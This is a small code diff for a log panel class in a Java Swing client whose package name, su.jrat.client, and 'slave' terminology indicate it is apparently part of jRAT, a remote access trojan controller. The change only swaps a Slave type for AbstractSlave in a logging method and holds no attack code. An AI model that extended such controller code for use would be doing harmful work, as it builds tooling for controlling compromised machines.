@@ -21,9 +21,9 @@ import javax.swing.JTable;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
+import su.jrat.client.AbstractSlave;
 import su.jrat.client.LogEntry;
 import su.jrat.client.Main;
-import su.jrat.client.Slave;
 import su.jrat.client.ui.frames.QuickFrame;
 import su.jrat.client.ui.renderers.table.LogTableRenderer;
 import su.jrat.client.utils.IconUtils;
@@ -143,8 +143,8 @@ public class PanelMainLog extends JPanel {
 
 	}
 
-	public void addEntry(String action, Slave slave, String info) {
-		LogEntry logEntry = new LogEntry(action, slave, info);
+	public void addEntry(String action, AbstractSlave abstractSlave, String info) {
+		LogEntry logEntry = new LogEntry(action, abstractSlave, info);
 		getModel().insertRow(0, logEntry.getDisplayData());
 	}
 
